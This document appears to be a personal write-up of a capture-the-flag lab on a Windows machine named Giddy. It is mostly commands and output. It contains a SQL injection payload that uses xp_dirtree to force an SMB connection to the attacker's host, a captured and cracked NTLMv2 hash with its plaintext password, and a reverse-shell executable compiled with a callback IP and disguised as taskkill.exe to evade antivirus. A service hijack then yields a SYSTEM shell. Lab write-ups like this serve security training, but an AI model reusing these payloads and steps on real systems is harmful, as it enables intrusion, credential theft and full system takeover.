

## Lab Details
- Difficulty: Medium
- OS: Windows

## Summary
- Initial access: SQLi 
- Privilege escalation: CVE-2016-6914

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.96.140 -p80,443,3389,5985 -Pn -sC -sV -A
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-06 22:57 EDT
Nmap scan report for 10.129.96.140
Host is up (0.0026s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_ssl-date: 2026-07-07T02:57:59+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn: 
|   h2
|_  http/1.1
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2026-07-06T02:28:57
|_Not valid after:  2027-01-05T02:28:57
|_ssl-date: 2026-07-07T02:57:59+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
<SNIP>
```
- Perform fuzzing against the target
- Identified `remote` and `mvc`
```
$ gobuster dir -u https://10.129.96.140/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.129.96.140/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 159] [--> https://10.129.96.140/aspnet_client/]
/mvc                  (Status: 301) [Size: 149] [--> https://10.129.96.140/mvc/]
/remote               (Status: 302) [Size: 157] [--> /Remote/default.aspx?ReturnUrl=%2fremote]
Progress: 20481 / 20482 (100.00%)
===============================================================
Finished
===============================================================
```
- the `remote` endpoint has a PowerShell web access login page
![[Pasted image 20260707110929.png]]
## Foothold

#### Steps
- Enumerate `mvc` found there is a SQLi on Search.aspx 
- Testing with below payload with display data from database 
```
' -- -
```

![[Pasted image 20260707111325.png]]
- We can attempt to perform UNC Path Injection via the SQLi with below payload 
```
'+EXEC+master.sys.xp_dirtree+'\\10.10.16.197\share--
```
- Start `responder`  we get a hash back as Stacy 
```
$sudo responder -I tun0
<SNIP>
[SMB] NTLMv2-SSP Client   : 10.129.96.140
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:0fd030af585ae470:F3FEFB06E7BC5509608B9D9560CA0791:010100000000000080300410B30DDD01758EBF0A3120796000000000020008004B0049004800360001001E00570049004E002D003500390053004D00580045004A00540045003800520004003400570049004E002D003500390053004D00580045004A0054004500380052002E004B004900480036002E004C004F00430041004C00030014004B004900480036002E004C004F00430041004C00050014004B004900480036002E004C004F00430041004C000700080080300410B30DDD0106000400020000000800300030000000000000000000000000300000E49361D58A303F10C2C34BBF93FF81F67791A7324BCF176DC86B63AB465FF3D50A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00310039003700000000000000000000000000
[*] Skipping previously captured hash for GIDDY\Stacy
[*] Skipping previously captured hash for GIDDY\Stacy
[+] Exiting...
```
- Use hashcat to decrypt the hash
```
$hashcat hash /usr/share/wordlists/rockyou.txt
<SNIP>
STACY::GIDDY:0fd030af585ae470:f3fefb06e7bc5509608b9d9560ca0791:010100000000000080300410b30ddd01758ebf0a3120796000000000020008004b0049004800360001001e00570049004e002d003500390053004d00580045004a00540045003800520004003400570049004e002d003500390053004d00580045004a0054004500380052002e004b004900480036002e004c004f00430041004c00030014004b004900480036002e004c004f00430041004c00050014004b004900480036002e004c004f00430041004c000700080080300410b30ddd0106000400020000000800300030000000000000000000000000300000e49361d58a303f10c2c34bbf93ff81f67791a7324bcf176dc86b63ab465ff3d50a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310036002e00310039003700000000000000000000000000:xNnWo6272k7x
```
- Confirm the username and password using `nxc`
```
$nxc rdp 10.129.96.140 -u STACY -p xNnWo6272k7x
RDP         10.129.96.140   3389   GIDDY            [*] Windows 10 or Windows Server 2016 Build 14393 (name:GIDDY) (domain:Giddy) (nla:True)
RDP         10.129.96.140   3389   GIDDY            [+] Giddy\STACY:xNnWo6272k7x
```
- Using the credential to login to PowerShell Web Access
```
Giddy\STACY # username 
xNnWo6272k7x # password
Giddy # computer name
```
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- Enumerate installed applications 
```
PS C:\> Get-ChildItem -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall","HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall" -ErrorAction SilentlyContinue | Get-ItemProperty -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName -and $_.DisplayName -notmatch "KB[0-9]{6,}" -and $_.Publisher -notmatch "Microsoft|Windows" } | Select-Object DisplayName, Publisher, DisplayVersion, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize

DisplayName                        Publisher               DisplayVersion  InstallDate

-----------                        ---------               --------------  

Java 7 Update 71 (64-bit)          Oracle                  7.0.710         20180616  
Microsoft SQL Server 2016                                                          
Microsoft SQL Server 2016 (64-bit)                                                 
Ubiquiti UniFi Video               Ubiquiti Networks, Inc. 3.7.3                   
VMware Tools                       VMware, Inc.            12.5.1.24649672 20260706    
```
- Identified `Ubiquiti UniFi Video` 
- Search online for privilege escalation found https://www.exploit-db.com/exploits/43390
- When restarting the service of `Ubiquiti UniFi Video` it executes a program that doesn't exist in the folder of `C:\ProgramData\unifi-video`
```
    Directory: C:\ProgramData\unifi-video
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/16/2018   9:54 PM                bin
d-----        6/16/2018   9:55 PM                conf
d-----        6/16/2018  10:56 PM                data
d-----        6/16/2018   9:54 PM                email
d-----        6/16/2018   9:54 PM                fw
d-----        6/16/2018   9:54 PM                lib
d-----         7/6/2026  10:31 PM                logs
d-----        6/16/2018   9:55 PM                webapps
d-----        6/16/2018   9:55 PM                work
-a----        7/26/2017   6:10 PM         219136 avService.exe
-a----        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
-a----        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
-a----        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
-a----        7/26/2017   6:10 PM          48640 UniFiVideo.exe
-a----        7/26/2017   6:10 PM          32038 UniFiVideo.ico
-a----        6/16/2018   9:54 PM          89050 Uninstall.exe
```
- Find the service of the program 
```

PS C:\ProgramData\unifi-video> Get-Service "Ubiquiti UniFi Video" | fl *

Name                : UniFiVideoService

RequiredServices    : {Afd, Tcpip}
CanPauseAndContinue : False
CanShutdown         : True
CanStop             : True
DisplayName         : Ubiquiti UniFi Video
DependentServices   : {}
MachineName         : .
ServiceName         : UniFiVideoService
ServicesDependedOn  : {Afd, Tcpip}
ServiceHandle       : 
Status              : Running
ServiceType         : Win32OwnProcess
StartType           : Automatic
Site                : 
Container           : 
```
- Anti-virus is running on the target so we will need to generate a reverse shell executable that is less likely to be flagged by the anti-virus
- Use https://github.com/dev-frog/C-Reverse-Shell to generate a reverse shell 
- We will need to modify the `re.cpp` with our IP and port number
```
70 else {
71    char host[] = "192.168.0.101";  // change this to your ip address
72    int port = 4444;                //chnage this to your open port
73    RunShell(host, port);
74}
```
- Compile it 
```
$i686-w64-mingw32-g++ re.cpp -o taskkill.exe -lws2_32 -lwininet -s -ffunction-sect
ions -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- Move the reverse shell to target then stop the service
```
Stop-Service -Name Unifivideoservice -Force
```
- On our listener we will receive a reverse shell as `nt authority \ system` 
```
$nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.96.140 49818

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\ProgramData\unifi-video>whoami
whoami
nt authority\system
```
## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: